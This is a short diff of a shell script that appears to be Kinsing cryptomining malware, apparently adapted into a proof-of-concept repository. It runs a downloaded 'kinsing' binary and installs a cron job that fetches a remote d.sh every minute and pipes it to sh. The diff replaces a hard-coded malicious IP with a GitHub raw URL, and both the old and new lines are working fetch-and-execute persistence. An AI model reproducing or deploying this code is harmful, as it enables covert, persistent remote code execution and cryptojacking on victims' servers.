@@ -612,13 +612,13 @@ download3() {
 download
 $DIR/kinsing
 
-crontab -l | grep -e "185.92.74.42" | grep -v grep
+crontab -l | grep -e "https://raw.githubusercontent.com/vsk-coding/kinsing-poc/main/d.sh" | grep -v grep
 if [ $? -eq 0 ]; then
   echo "cron good"
 else
   (
     crontab -l 2>/dev/null
-    echo "* * * * * $LDR http://185.92.74.42/d.sh | sh > /dev/null 2>&1"
+    echo "* * * * * $LDR https://raw.githubusercontent.com/vsk-coding/kinsing-poc/main/d.sh | sh > /dev/null 2>&1"
   ) | crontab -
 fi
 
